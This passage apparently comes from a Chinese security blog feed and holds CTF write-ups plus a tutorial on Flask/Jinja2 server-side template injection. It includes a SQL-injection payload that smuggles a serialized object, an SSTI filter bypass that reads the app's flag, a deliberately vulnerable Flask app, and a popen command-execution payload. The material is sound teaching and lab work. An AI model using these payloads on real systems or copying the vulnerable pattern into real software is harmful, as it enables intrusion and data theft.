<p><code>-1/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;abelche&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;#</code></p>
<p>查看页面源码得到</p>
<p><img src="https://wjpbpw.sn.files.1drv.com/y4mC9zn_fxgwXErBdmHluORiBDYz3jO7ZBIRPb3ap1ilYR9UikdIjmGNhWtxe0cB4Lno8l1lWFqiEDJhF8D1GCapzhRupO17rxgoNcY7l9H9MUn44eFGhryeg3yExVE9oeoyf0q_IoWkZ339i3xMXo81B_ddbAe_iIvdm7iCJMbMCTBfspoXht3vtnzmMagu5skvUvlxtQ0jM_nFnEt5iOrbA?width=976&height=253&cropmode=none" alt></p>
<p>base64解码得到flag</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
        <tag>sql注入</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-TokyoWesterns CTF 4th 2018 shrine</title>
    <url>/2019/07/27/Writeup/WP-TokyoWesterns-CTF-4th-2018-shrine/</url>
    <content><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><p><a href="https://github.com/CTFTraining/westerns_2018_shrine/tree/3ed6a3c77c5f62cbf9ec39faebcbb06b0b668b51" target="_blank" rel="noopener">https://github.com/CTFTraining/westerns_2018_shrine/tree/3ed6a3c77c5f62cbf9ec39faebcbb06b0b668b51</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFTraining/westerns_2018_shrine.git</span><br><span class="line"><span class="built_in">cd</span> westerns_2018_shrine</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker run -d -p 1000:5000 ctftraining/westerns_2018_shrine:latest</span><br></pre></td></tr></table></figure>

<p>访问 http://[你的ip]:1000/ 即可</p>
<a id="more"></a>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>打开页面就是一段源码，右键查看下源码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>明显是个 flask 在 /shrine/ 下的 SSTI</p>
<p>而且对 payload 进行了过滤</p>
<ul>
<li>对小括号进行了替换，将 <code>(</code> 和 <code>)</code> 替换为空字符串</li>
<li>将 config 和 self 添加进了黑名单</li>
</ul>
<h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yzoedw.sn.files.1drv.com/y4mhbVz4dvrrB9Bsp5bz1GeVPtGiGhoJbCxmn0CBgjukhluAOKeSWCW1UcZyzNR9dPlXFmB8iyB4o-1Olg-kwfQKgAUDs76YrryH0G_KbQknJ4XD-luZ7ZE3PzILGPT8A_ch3dK8tUtLOnYD3on8pgwxND9wxtGkoIrju0JAImBBDk8z6kb8rFmcoNNZbZQgoNg89X8HRONKHIIs7b3Her-jw?width=558&height=99&cropmode=none" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="string">'7'</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yzobdw.sn.files.1drv.com/y4mxBpIEA-D63S7ouW3V8cxgkPhzXsQdzItrXqZZJ01E-TeZUBall5Eo1lIuuCO1Uf2veIS3Wxt-XvtHHSSsx5B-QMEs94E8Wi1P3St3VHkidYj0HUwy37eim7LNEd7Xu3sTDRsrLd7NMLd8b7goeZgFLRYrALA47vXMQ6NLOGAJISh2ppOp1MOTJZNBa7rKap_ts2wqsKqIt6JRKxeoFKrWg?width=577&height=85&cropmode=none" alt></p>
<p>测试发现是 jinja2 或 Twig，后端源码为 flask</p>
<p>所以这个是关于 flask + jinja2 的 SSTI </p>
<p>至于为什么，请看图</p>
<p><img src="https://q6fcrw.sn.files.1drv.com/y4myLNDZak2pCjhPIenf32kI7a3LLRkhH0Ir5BIv4Ffn6A7hmtH7rKKPjLPQ5H-n1Ehzisv7N3J1cZI3HxPSTIOguXF95B3z7i0AYW1DKfqLhEg-u6rZmPuu0Ro6T2tu14uOotDOS96PD-n60n7e4v6uquf8rquH1i5InQPcbnZld8TN1C2_MhZckiTGHFXJOWIakiBMEpaCHvJkF2TaFXVYw?width=640&height=386&cropmode=none" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yzoddw.sn.files.1drv.com/y4m9msEgTT0lo_tgvsEds6Excn8kKA4RFIF1P7TBH_MqTAK-u3Jboo7gqJqCOA8CpABzvYyONdjflghFphpEkBmxuMoLhoC29zUEnsPsdLkuDKBtrJFYdDOghgMkIsHJ_DDkoLskv3C3LKOOelYeBjkilMt3juD6wxbsRW7iSHU0m0dLT7Uus5_fbfqpJ3IBwD1XF-ZdJrHRohblh5Cg5G22g?width=773&height=83&cropmode=none" alt></p>
<p>明显这里对 <code>()</code> 进行了过滤</p>
<p>只能从别的地方入手，例如 flask 的内置函数和变量，</p>
<p>当然，config 和 self 也被加入了黑名单</p>
<p>但通过变量去读取 app.config 也会涉及到 <code>()</code> 的使用</p>
<p>所以只剩下内置函数</p>
<p>get_flashed_messages(), url_for()</p>
<p>构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yzocdw.sn.files.1drv.com/y4mwv7czHlNKjZ7Tl0LJx2VXFsBzgJyrCNPO64kYrY_sp6sET35LdP_x54pbDfXnHQByHM_mGhaALHetn0qJ5Zwx529YSZcIAlKZHBZcjVr3y5jSn8bIHBz7GE-rsTbwoHNFNOVdwfN1SvxOGygYeDW0VkOaYW_13X46H-nLm_5G5BCj3FXM303YFnaDTZ7ADkcRmd6nYGYLE_Q1mribvex5g?width=932&height=74&cropmode=none" alt></p>
<p>得到flag</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是一道很简单很基础的 SSTI</p>
<p>总体思路就是</p>
<blockquote>
<ol>
<li>判断 SSTI 类型</li>
<li>分析过滤</li>
<li>构造 payload </li>
</ol>
</blockquote>
<p>最后，关于 SSTI :</p>
<p><a href="/2019/07/27/SSTI-服务端模板注入简析/">SSTI-服务端模板注入简析</a></p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>flask</tag>
        <tag>jinja2</tag>
      </tags>
  </entry>
  <entry>
    <title>从 flask+jinjia2 认识 SSTI 服务端模板注入</title>
    <url>/2019/07/27/SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%AE%80%E6%9E%90/</url>
    <content><![CDATA[<p><img src="https://8ke7rw.sn.files.1drv.com/y4maedzleRsLFxdY5nF7fH88VfDC11rTKHBin0_-Havq7y5z6Ptgod5u_uLfRV1AbFpNIQYOpa0OEMa70_bz0tlETO78KV8ZrSqi9I5dGbTXv7Rem3JU-mZPth3QjkMisOsa_nstR_UQKWjGALwA_k9h3KOfJhnZFNRO6EZ66tBaVCs8CZVaK-CiUqzQgFgeZVd0GEgxCheZsVDOQ6plTqGIw?width=807&height=404&cropmode=none" alt></p>
<p>推荐文章 <a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></p>
<p>以 flask+jinja2 的 SSTI 为例分析 SSTI</p>
<a id="more"></a>

<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>SSTI (Server-Side Template Injection) 服务端模板注入，那么要先了解模板是什么</p>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让(网站)程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据(变量)到实际的视觉表现(HTML代码)这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
<p>通俗点理解:拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>后端渲染:浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>
<p>前端渲染:前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>
<p>举个例子:(django)</p>
<blockquote>
<p>前端代码:index.html</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>后端代码:view.py</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">'message'</span>: <span class="string">'hello world'</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> render(request, <span class="string">'index.html'</span>, data)</span><br></pre></td></tr></table></figure>

<p>那么当我们去访问 index.html 这个页面的时候页面从后端拿到message的数据<br>呈现给用户的页面显示为:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="SSTI-1"><a href="#SSTI-1" class="headerlink" title="SSTI"></a>SSTI</h2><p>web 应用程序通过使用模板在网页中嵌入动态内容，那么如果显示的内容是用户可控的，可能首先会想到 XSS ，而存在 XSS 的地方很有可能存在 SSTI</p>
<p><img src="https://q6fbrw.sn.files.1drv.com/y4mejS9j8grOQ9skPUeAFuQviqVH03U4Jm629JbS4g1xWcTj4jtDdlcNQqz44K4k5ii-KhOpmuXUZ7LQa5WtJ2bi1PkGqI4AQtg9VkKysHTwnsI64B8U_MbUQPxJ0E3QJixjF_uc7Uuq-wQK_cWKjH25vpqN-WDW0Vj4taUCjlbroVJQO5yAAsvPWcJfmzg2GJyJl5mR7h7prm0c7iEVrNzWQ?width=807&height=225&cropmode=none" alt></p>
<h2 id="本地测试-flask-jinja2"><a href="#本地测试-flask-jinja2" class="headerlink" title="本地测试(flask + jinja2)"></a>本地测试(flask + jinja2)</h2><p>新建一个 flask 项目:</p>
<blockquote>
<p>app.py</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">(name)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">'welcome.html'</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/h/&lt;name&gt;', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;hello %s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        '''</span> % name</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">'127.0.0.1'</span>,</span><br><span class="line">        port=<span class="number">8000</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<blockquote>
<p>index.html</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this is a SSTI test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h3</span>&gt;</span>hello &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果如图:</p>
<p><img src="https://q6eqrw.sn.files.1drv.com/y4mzrn1oKK7TVtR_0nKAA4ZWZ44HUBFaDgjaasQK_vFEEIMhZmBV2rixIdbdidKCNnaGePNbUO7rehzcVfguxXfd0h-8rMj_dGMiQQBOOgolqbpuRvG9539YgqFxgS4MJruOyPGjNIIgS0iAJVVsmjL8Tx4vl439ZkcQeFkaj7Zwm43fDatUcK1j5u5h5HJWnyz9J-ioInxnTbMVbjvAk74cg?width=794&height=124&cropmode=none" alt></p>
<p><img src="https://q6eprw.sn.files.1drv.com/y4m4ugGl9-dFBgF75-lHExaiK8nftBMRZPNhgaKt2b02ITX0QOVsbAmRVnk7i2NCECJs83EAZKhO1h9HhWSWWB1oRMGskSi9Ni6PF4Rfxsk6lUmOlCN4K09T91KGfF8B3Y4HIFn6NLO34X5peDNsaeG6nJLJwGvzZVK__Y09lohrP6ZBZeshwkLn6b1TxuLauSDPoMxxFCxys6s4evblSHELA?width=782&height=126&cropmode=none" alt></p>
<p>明显 flask 返回模板字符串的存在 XSS</p>
<p>第一个没有触发XSS的原因就是模板对符号进行了编码即用户对此不可控</p>
<p><img src="https://q6e9rw.sn.files.1drv.com/y4mSbC9IGRGhsWFqEbj103mM9rob-omkZheboqp3YYBf7f8ovUBfcrKELCGT8uicJbw2SaepMGbGqW0rorPpCB7nMYP-tO74XJ-CywzEAwG2U5qHfpHGhNyGvHEqgdmwmjYSJoMoFA30vxxMhQsQuq_4n-XSraq0j55RngxrT9uRXE_ib5eUs556k49Q6WRoQoq09ylaaLooZjjl0Kc0gFlpA?width=964&height=301&cropmode=none" alt></p>
<p>继续在触发 XSS 的点进行 SSTI 测试:<br>最简单的 payload : </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">12312</span>*<span class="number">213</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qqfbrw.sn.files.1drv.com/y4mC8SfgvO41Nysziu5yiFZQ-dgrt4Mbr2yZMxrfNC3uTko0znQgmtGRKsR88IMJeS6ZvumqFUf4bdXlmSiJuDha6mdHMnQUtjXtoHnnvqdyKr2eReNQsC9rSCwx5-HnoJJux1DWNQKn116zCWX8oNtnAijvAUFvJJKOLwVY-dnVKr83QH4RqHm8Tfrpts7soJfxYpJWPfE0ZnvyR-VFljxnA?width=503&height=114&cropmode=none" alt><br>代码执行成功<br>试下查看目录，payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'dir'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qqfarw.sn.files.1drv.com/y4mIdxNYH1oYncJxtIE5v-fRFeQLkpWyC3RYajOrHIyvd3PpJltEW-KAqloU2F3B3U921-1oCcOPmnlHH9RDgKig-_TNmPPK2fzRKOtJpsaGrl_g9tQypX11SAgSBJI1kqY9bE7JPL5Nf-2FiE-aAMPEslrtYAG19QGkV3S2DGF65MPFRVm7S75-UkxvbZFZlAdabwjDo0CygG_l7ZSB3AIlg?width=1909&height=138&cropmode=none" alt><br>getshell 什么的也不用多说了</p>
<h1 id="python-常用内建属性"><a href="#python-常用内建属性" class="headerlink" title="python 常用内建属性"></a>python 常用内建属性</h1><h2 id="class"><a href="#class" class="headerlink" title="__class__"></a>__class__</h2><p>__class__ 可以用来查看对象的类型,返回值为 type</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">list</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">type</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a>__bases__</h2><p>__bases__ 可以列出该类的基类，返回值为 tuple</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__bases__</span><br><span class="line">(&lt;class 'object'&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">object</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__bases__</span>.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">tuple</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a>__mro__</h2><p>__mro__ 给出了 method resolution order ，即<strong>解析方法调用的顺序</strong>， 返回值为 tuple</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__class__.__mro__</span><br><span class="line">(&lt;class 'type'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">tuple</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a>__subclasses__()</h2><p>__subclasses__() 用于获取一个类的子类，返回值为 list</p>
<p>而__subclasses__ 的返回值则是 python 内建方法 builtin_function_or_method</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __subclasses__ of type object at <span class="number">0x00007FFD2B796D30</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">builtin_function_or_method</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span></span></span><br><span class="line">[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, </span><br><span class="line">...</span><br><span class="line">&lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class '__future__._Feature'&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__().__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">list</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a>__globals__</h2><p>__globals__ 用于返回一个当前空间下能使用的模块，方法和变量的字典</p>
<p>这个属性是对函数的操作，即:用法为<code>函数名.__globals__</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>            print(<span class="string">'A.fun'</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.fun.__globals__</span><br><span class="line">&#123;'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': &#123;&#125;, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'A': &lt;class '__main__.A'&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>classA = A()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>classA.fun.__globals__</span><br><span class="line">&#123;'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': &#123;&#125;, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'A': &lt;class '__main__.A'&gt;, 'classA': &lt;__main__.A object at 0x000001F2CA247F98&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>classA.fun.__globals__.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">dict</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="builtin-和-builtins"><a href="#builtin-和-builtins" class="headerlink" title="__builtin__ 和 __builtins__"></a>__builtin__ 和 __builtins__</h2><p>启动Python解释器或运行一个Python程序时，内建名称空间都是从__builtins__模块中加载的，只是__builtins__本身是对Python内建模块__builtin__的引用，而这种引用又分下面两种情况:</p>
<ul>
<li>如果是在主模块__main__中，__builtins__直接引用__builtin__模块，此时模块名__builtins__与模块名__builtin__指向的都是同一个模块，即<builtin>内建模块(这里要注意变量名和对象本身的区别)</builtin></li>
<li>如果不是在主模块中，那么__builtins__只是引用了__builtin__.__dict__</li>
</ul>
<p>建议查看官方文档 <a href="https://docs.python.org/zh-cn/3/library/builtins.html" target="_blank" rel="noopener">python3 builtins</a></p>
<p><a href="https://docs.python.org/zh-cn/2.7/library/__builtin__.html" target="_blank" rel="noopener">python2 __builtin__</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3.7.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(<span class="string">'builtin'</span>)</span><br><span class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'capitalize'</span>, <span class="string">'casefold'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'format_map'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isascii'</span>, <span class="string">'isdecimal'</span>, <span class="string">'isdigit'</span>, <span class="string">'isidentifier'</span>, <span class="string">'islower'</span>, <span class="string">'isnumeric'</span>, <span class="string">'isprintable'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'maketrans'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__</span><br><span class="line">&lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BlockingIOError'</span>, <span class="string">'BrokenPipeError'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'ChildProcessError'</span>, <span class="string">'ConnectionAbortedError'</span>, <span class="string">'ConnectionError'</span>, <span class="string">'ConnectionRefusedError'</span>, <span class="string">'ConnectionResetError'</span>, <span 